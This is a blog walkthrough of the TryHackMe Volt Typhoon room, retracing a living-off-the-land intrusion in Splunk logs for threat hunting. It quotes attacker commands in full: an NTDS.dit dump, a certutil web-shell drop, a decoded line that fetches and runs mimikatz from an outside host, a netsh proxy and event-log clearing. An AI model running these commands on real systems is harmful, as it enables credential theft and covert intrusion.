---
title: "TryHackMe Volt Typhoon: Retracing an APT Through Three Log Sources"
date: 2026-08-22T15:05:00+05:30
lastmod: 2026-08-22T15:05:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-volt/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Splunk
  - Volt Typhoon
  - Living Off The Land
  - Threat Hunting
  - Blue Team

draft: false
description: "Walkthrough of TryHackMe Volt Typhoon: reconstructing a full living-off-the-land intrusion in Splunk from ADSelfService Plus, wmic and PowerShell logs — the password reset at 11:10:22, the voltyp-admin account, an ntdsutil AD database dump renamed to cl64.gif, a certutil-decoded ASPX web shell and four event logs cleared."
---

## Volt Typhoon

Room 1 of 5 in the **SOC Level 2 Capstone Challenges** module, and the first of the two Splunk capstones. Like [The Silent Transfer](/post/thm-room-operationsilenttransfer/) over in Advanced Traffic Analysis, there is no teaching content here — nine tasks, sixteen answers, a scenario paragraph and a Splunk instance. Unlike that room, the framing is an attribution exercise: every task is named after an ATT&CK tactic and the questions assume you know how Volt Typhoon actually operates, because the dataset is deliberately full of activity that looks like the same commands run by legitimate admins.

![Cover card for the TryHackMe Volt Typhoon room, showing the three log sources and the answer chain from the ADSelfService Plus password change through the 7z archive to the cleared event logs](/img/thm-volt/00-thumbnail.png)

The whole dataset is one index and three sourcetypes, which is the first thing worth establishing:

```
index=* | stats count by index sourcetype
# index  sourcetype    count
# main   adss            666   <- ADSelfService Plus self-service portal
# main   powershell      438   <- Event 800 pipeline execution details
# main   wmic            942   <- pipe-delimited wmic command log
```

Set the time picker to **All time** before anything else. The data is backdated to March 2024 and the default *Last 24 hours* returns nothing, which reads exactly like a broken lab.

The `wmic` sourcetype is pipe-delimited and parses cleanly:

```
index=main sourcetype=wmic
| rex "^(?<ts>\S+) \| (?<user>[^|]+) \| (?<host>[^|]+) \| (?<ip>[^|]+) \| (?<cmd>[^|]+) \| "
| stats count by user
# bill-exec              173
# claire-exec            133
# dean-admin             373
# june-exec              123
# sophie-engineering     140
```

Five users, no `voltyp-admin`, and 476 distinct commands. That distribution matters: the attacker never gets their own line in the `wmic` log. Everything after initial access is `dean-admin`, mixed in with the real `dean-admin` doing real work. There is no user field to filter on and no `EventCode` to pivot from — the discriminator in this room is always *the command itself*.

## Task 2: The reset that was not a reset

ADSelfService Plus logs are comma-separated and end with a delivery channel:

```
2024-03-30T20:01:22, ADSelfServicePlus, sales-02, 192.168.1.156, juan-sales, Account Unlock, completed, web_browser
```

Pulling every event for Dean returns dozens of rows across the two weeks, and almost all of them are noise — `dean-admin` unlocks their own account roughly once a day. One cluster is not noise:

```
index=main sourcetype=adss dean | sort _time | table _raw
# 2024-03-24T11:08:17 ... 192.168.1.134, dean-admin, Account Unlock, failed
# 2024-03-24T11:08:42 ... 192.168.1.134, dean-admin, Account Unlock, failed
# 2024-03-24T11:09:03 ... 192.168.1.134, dean-admin, Account Unlock, failed
# 2024-03-24T11:09:15 ... 192.168.1.134, dean-admin, Account Unlock, failed
# 2024-03-24T11:10:03 ... 192.168.1.134, dean-admin, Account Unlock, completed
# 2024-03-24T11:10:22 ... 192.168.1.134, dean-admin, Password Change, completed
# 2024-03-24T11:11:03 ... 192.168.1.134, dean-admin, Account Update,  completed
```

Four failed unlock attempts in 58 seconds from a single host, then a success, then a password change 19 seconds later. Dean's password was changed at **2024-03-24T11:10:22** — that is the moment the account stopped belonging to Dean.

The distinction between *Password Change* and *Password Reset* is the trap in this task. Dean has `Password Reset` events on 20, 22, 26, 27 and 28 March, several of them from `server-01` and one of them failed — the kind of thing a real user does. `Password Change` appears 39 times across the dataset and only once inside a brute-force cluster. Sorting on the action alone gets you the wrong timestamp; you need the failure burst immediately before it.

The same source IP answers the next question two minutes later:

```
index=main sourcetype=adss earliest="03/24/2024:11:00:00" latest="03/24/2024:13:00:00"
# 2024-03-24T11:12:26 ... 192.168.1.134, voltyp-admin, Enrollment, completed
# 2024-03-24T11:12:53 ... 192.168.1.134, voltyp-admin, Account Unlock, completed
# 2024-03-24T11:13:34 ... 192.168.1.134, voltyp-admin, Password Change, completed
# 2024-03-24T11:14:02 ... 192.168.1.134, voltyp-admin, Security Question Setup, completed
# 2024-03-24T11:14:45 ... 192.168.1.134, voltyp-admin, MFA Setup, completed
```

The new administrator account is **voltyp-admin**, and the sequence is worth reading as tradecraft rather than as an answer. `Enrollment` is the first-ever appearance of that username in the portal; the attacker then sets its password, its security questions *and* its MFA within 140 seconds. That is not sloppiness — a self-service account with the attacker's own recovery factors survives Dean's password being reset back by the help desk.

There is a small piece of misdirection right after: at 12:00:01 the same `192.168.1.134` shows up doing an MFA setup for `claire-exec`. It sits in the middle of the attack window and looks like a second victim. Addresses in this dataset are not stable identities — `192.168.1.134` also shows up twice on 17 March in the `wmic` log, once as `bill-exec` on `server-01` and once as `claire-exec` on `server-02`. The IP is corroborating evidence for the 11:08–11:15 cluster, not an identity.

## Task 3: ntdsutil, and a password sitting in the command line

Volt Typhoon's signature is that nothing gets dropped. The information-gathering command the room asks for is textbook remote WMI:

```
index=main "/node"
# 2024-03-25T21:30:03 | dean-admin | server-02-main | 192.168.1.153 |
#   wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
```

The answer is that whole string — **`wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename`** — and the space after the comma is real, not a transcription slip. The answer mask (`**** /****:********, ******** ***********...`) confirms it before you submit; counting the mask against your candidate is the cheapest way to settle whether the room wants the `/node:` prefix or just the tail.

Searching `/node` is what turns this room from a needle hunt into a chain. Only seven events in the entire dataset contain that string, and all seven are the intrusion — five here, two more in Task 9. Add the one `ntdsutil` hit (which has no `/node:` prefix, because it runs locally on the DC) and the staging sequence reads end to end:

| Time | Command |
|---|---|
| 2024-03-25T21:30:03 | `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` |
| 2024-03-25T22:44:31 | `wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit\""` |
| 2024-03-25T22:45:27 | `wmic /node:webserver-01 process call create "cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot"` |
| 2024-03-25T23:47:07 | `wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"` |
| 2024-03-26T02:02:35 | `wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif"` |
| 2024-03-26T02:04:28 | `wmic /node:webserver-01 process call create "cmd.exe rd /S C:\Windows\Temp"` |

The archive password is **d5ag0nm@5t3r**, passed on the `7z` command line with `-p` where any process-creation log will capture it. `-v100m` splits the archive into 100 MB volumes, which is a staging decision: it makes the AD database exfiltrate over an HTTP path in pieces small enough not to look like a database.

Two details in that table are the actual lesson. First, the dump lands in `C:\inetpub\wwwroot` — the web root of a machine called `webserver-01`. That is not carelessness; it is the exfiltration channel. The archive is retrieved over HTTP from the outside, so it never needs an outbound connection from the domain controller. Second, `ntdsutil.exe "ac i ntds" "ifm create full"` is the supported Microsoft way to take an Install-From-Media snapshot of Active Directory. No credential-dumping tool touched the DC at this stage. CISA's [AA24-038A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a) describes the real-world version of this step in almost these words — WMIC commands used to execute `ntdsutil` to copy `NTDS.dit` and the SYSTEM hive, then exfiltrate them to crack passwords offline — which is what the room is testing recognition of.

{{< ad >}}

## Task 4: A web shell that arrives as text

Persistence is built out of `echo` and `certutil`, three days later:

```
2024-03-28T21:07:50  mkdir C:\Windows\Temp
2024-03-28T21:10:32  cd C:\Windows\Temp
2024-03-28T21:14:57  echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSI... > C:\Windows\Temp\ntuser.ini
2024-03-28T21:19:23  certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
```

The web shell was placed in **`C:\Windows\Temp\`**. Base64-decoding the `echo` payload gives an ASP.NET page whose `<title>` is `awen asp.net webshell` and whose body is a single text box wired to `Process.Start("cmd.exe", "/c " + arg)` — a well-known public web shell, not custom code.

Note the two-stage naming. The base64 blob is written to `ntuser.ini`, a filename that exists legitimately in every user profile and attracts nothing; only `certutil -decode` produces something with an `.aspx` extension, and it lives for the eleven hours until it is copied somewhere useful. Searching for `base64` in this dataset returns zero results — the string never appears, because the encoding is implicit in the `certutil` verb. The searchable indicator is `certutil -decode`, not the payload.

## Task 5: Covering tracks, one registry value at a time

Defense evasion starts before the web shell, on the night of the AD dump:

```
2024-03-25T21:44:49  $registryPath = "HKCU:\Software\Microsoft\Terminal Server Client\Default"
2024-03-25T21:46:42  Get-ItemProperty -Path $registryPath
2024-03-25T21:48:28  Remove-ItemProperty -Path $registryPath -Name MRU0 -ErrorAction SilentlyContinue
```

The cmdlet that removes the Most Recently Used record is **`Remove-ItemProperty`**. `MRU0` under `Terminal Server Client\Default` is the last host typed into the RDP client, so deleting it erases the only local trace of where the operator connected from. This exact three-line sequence repeats on 26, 28 and (in the `$registryPath` form) 25 March — it is a habit, not a one-off, and the `Get-ItemProperty` on the line before is the operator confirming the value exists before deleting it.

The archive from Task 3 gets its second identity here. `cisco-up.7z` becomes **cl64.gif** — a name that is both a plausible web asset and, sitting in `wwwroot`, something IIS will serve without complaint. A file-extension allowlist on the web root does not stop this; the bytes are still 7z.

Anti-analysis checks run the following evening, and they are broad:

```
2024-03-26T21:06:24  Get-WmiObject -Class Win32_ComputerSystem | Select-Object Manufacturer, Model
2024-03-26T21:08:07  Get-Service | Where-Object { $_.DisplayName -like "*VMware*" -or $_.DisplayName -like "*VirtualBox*" }
2024-03-26T21:11:33  Get-WmiObject -Class Win32_BIOS | Select-Object Manufacturer, SMBIOSBIOSVersion
2024-03-26T21:12:46  Get-WmiObject -Class Win32_PnPSignedDriver | Where-Object { $_.DeviceName -like "*VirtualBox*" ... }
2024-03-26T21:15:18  Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*
```

Five VM checks in nine minutes, only one of which touches the registry: **`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`**, filtered to properties matching `*Virtual*`. The question says "regedit path", which is worth reading carefully — the answer is the hive path in `HKEY_LOCAL_MACHINE\...` long form as it appears in the log, not the `HKLM:\` PowerShell drive form used elsewhere in the same session. The mask settles it: nineteen characters before the first backslash.

## Task 6: Credentials by inventory, then mimikatz

Rather than dumping LSASS immediately, the operator spends three hours on 27 March enumerating remote-access software through the registry:

```
2024-03-27T19:24:02  reg query hklm\software\OpenSSH
2024-03-27T19:29:40  reg query hklm\software\OpenSSH\Agent
2024-03-27T20:46:39  reg query hklm\software\realvnc
2024-03-27T20:56:21  reg query hklm\software\realvnc\vncserver
2024-03-27T21:01:36  reg query hklm\software\realvnc\Allusers
2024-03-27T22:01:50  reg query hklm\software\realvnc\Allusers\vncserver
2024-03-27T22:26:05  reg query hkcu\software\dean-admin\putty\session
```

Three products: **OpenSSH, PuTTY, RealVNC**. Alphabetical order is the room's requested format and it also happens to be the reverse of the interesting order — the PuTTY key comes last and is the only one under `HKCU`, because saved PuTTY sessions are per-user and carry stored hostnames and sometimes private key paths. Each product is drilled down through progressively deeper subkeys, which is what distinguishes this from a scripted software inventory: a real inventory reads `Uninstall\*` once, and in fact this operator does exactly that at 22:41 as a separate action.

The mimikatz question is the one that requires actual work. The command is logged as an encoded PowerShell invocation:

```
2024-03-26T21:53:41
-exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20v...
```

Searching for `mimikatz` or `base64` in Splunk returns nothing — the string is inside the blob. Decoding it gives the answer:

```bash
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode())" SW52b2tlLVdlYlJlcXVlc3Qt...
# Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe";
#   Start-Process -FilePath "C:\Temp\db2\mimikatz.exe"
#   -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

The full decoded command is the answer, quotes and semicolon included. Two things make it consistent with the rest of the session: `mkdir C:\Temp\db2` runs two minutes earlier at 21:51 and `ls C:\Temp\db2` runs three minutes later at 21:56 — the operator creates the directory, downloads, then verifies. And `sekurlsa::minidump lsass.dmp` means mimikatz is being pointed at an *already existing* dump file rather than at live LSASS, so the memory acquisition happened by some other means and only the parsing needed a tool.

The answer mask is essential here. It masks the double quotes as `*` rather than showing them as literals, so the segment for `"http` counts five characters and `exe"` counts four. Reconstructing the command from the mask alone would produce something subtly wrong; decode first, then check the decode against the mask.

## Task 7: wevtutil as a hunting tool, pointed the wrong way

The operator uses `wevtutil` twelve times, and always as a query rather than a clear — until the very end. The event IDs are the interesting part:

```
2024-03-25T22:01:41  wevtutil qe security ... (EventID=4624) ... EventData[Data='admin']
2024-03-25T22:04:56  wevtutil qe security ... (EventID=4625) ...
2024-03-26T21:26:24  wevtutil qe security ... (EventID=4624) ... EventData[Data='workstation01']
2024-03-26T21:29:29  wevtutil qe security ... (EventID=4625) ... EventData[Data='192.168.1.134']
2024-03-26T21:31:57  wevtutil qe security ... (EventID=4769) ... EventData[Data='admin-workstation1.domain.local']
2024-03-28T20:27:20  wevtutil qe security ... (EventID=4769) ... EventData[Data='MSSQLSvc']
```

**4624 4625 4769** — successful logon, failed logon, Kerberos service ticket request. Every query is bounded by `TimeCreated[@SystemTime>'2024-03-24T00:00:00']`, which is the day the account was taken over. The attacker is running the same investigation a defender would, over the same window, to find out what the defenders can see: which of their logons succeeded, which failed loudly, and which service accounts have SPNs worth requesting tickets for. The 4625 query filtered to `192.168.1.134` on 26 March is the operator checking whether their own brute force left a trail.

Lateral movement is one line, and it renames the payload again:

```
2024-03-29T19:45:21  ls C:\Windows\Temp
2024-03-29T19:47:43  Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"
```

The new web shell is **AuditReport.jspx**. The extension change is the point: the same ASP.NET source is now sitting behind a `.jspx` name, which reads as a Java page and defeats a rule that alerts on new `.aspx` files under `wwwroot`. Whether IIS actually executes it depends on handler mappings — but as a detection-evasion move against filename-based rules it works, and it is the same trick as `cl64.gif` applied to a different file type.

## Task 8: Three years of finance, staged in Temp

Collection is deliberately quiet:

```
2024-03-27T23:41:29  Get-ChildItem -Path "C:\ProgramData" -Directory -Recurse
2024-03-27T23:42:48  Get-ChildItem -Path "C:\ProgramData\FinanceBackup\"
2024-03-27T23:44:10  New-Item -ItemType Directory -Path "C:\Windows\Temp\faudit" -ErrorAction SilentlyContinue
2024-03-27T23:51:55  Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"
2024-03-27T23:52:15  Copy-Item ... 2023.csv ...
2024-03-27T23:52:49  Copy-Item ... 2024.csv ...
```

**2022.csv 2023.csv 2024.csv**. The recursive listing of `C:\ProgramData` two minutes earlier is what found them, and the staging directory is named `faudit` — a name that survives a casual look at `C:\Windows\Temp` because it reads like a finance audit job.

The following night the same pattern repeats against browser data — `chrome`, `firefox`, `edge` and `ie` directories under `C:\Windows\Temp\browserbackups`, fed by `Copy-Item -Recurse` from each profile path. No question asks about it, but it explains what the mimikatz run was for: LSASS secrets plus browser credential stores is a complete credential harvest, and neither step required a tool that a file-based control would block.

## Task 9: A proxy, then the lights out

The C2 channel is `netsh`, executed remotely with credentials on the command line:

```
2024-03-29T23:13:09 | dean-admin | server-01-main | 192.168.1.184 |
  wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create
  "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1"
```

Connect address and port: **10.2.30.1 8443**. Read the parameters carefully, because there are two ports and two addresses in one command and the question asks for the *connect* pair. `listenport=50100` on `0.0.0.0` is where the compromised server accepts traffic; `connectport=8443` to `10.2.30.1` is where it forwards. Answering with the listen side is the obvious way to lose this question.

The proxy is deleted 43 minutes later at 23:56:30 and the host is shut down at 23:58:29 via `wmic os where Primary='TRUE' shutdown`. Two hours before that, the log clearing:

```
2024-03-29T22:04:23  wevtutil cl Application Security Setup System
2024-03-29T22:05:42  Get-Service -DisplayName *EventLog*
2024-03-29T22:07:19  Stop-Service -Name "EventLog" -Force
2024-03-29T22:09:54  Start-Service -Name "EventLog"
```

Four log types cleared: **Application Security Setup System**, in that order, in a single `wevtutil cl` invocation. The three lines after it are the more interesting half — stopping and restarting the Event Log service is how you make sure nothing that was buffered gets written back after the clear. And the order of operations across the whole night is the operator's own risk model: clear the logs at 22:04, *then* stand up the proxy at 23:13, use it, tear it down at 23:56, shut down at 23:58. The C2 channel only ever existed in a window where the logging was already broken.

## What carries over

**The absence of a tool is the signal.** Nothing in this intrusion is malware except one mimikatz binary fetched over plain HTTP. The AD database came out through `ntdsutil`, the archive through `7z`, the web shell through `echo` and `certutil`, the proxy through `netsh`, the discovery through `wmic` and `reg query` — every one of them signed, expected, and present on the host already. Which is why every answer in this room came from reading a command line rather than from an alert, a hash or a detection name. The searches that worked were `"/node"` (7 hits, all malicious), `ntdsutil` (1 hit), `certutil` (1 hit) and `"wevtutil cl"` (1 hit, against 12 `wevtutil` events overall) — four one-line searches against 2,046 events. The searches that failed were `mimikatz` and `base64`, both zero, because the interesting strings were inside a blob.

**A shared identity defeats user-based pivoting, so pivot on behaviour instead.** From 11:10 on 24 March there is no attacker account in the logs. `voltyp-admin` is created and then never used again — it is insurance, not an operating identity. Everything afterwards is `dean-admin`, alongside the real `dean-admin` running 373 legitimate `wmic` commands from a dozen different IPs. The thing that separates them is not who or where, but *what and when*: `wmic` with a `/node:` prefix, `Copy-Item` into `C:\Windows\Temp`, registry reads under `realvnc`, and all of it clustered between 21:00 and 02:00. Build the timeline out of command shapes and the sessions fall out on their own; try to build it out of usernames and there is nothing to build with.

Room solved 100% — 9 tasks, 16 answers, 900 points.
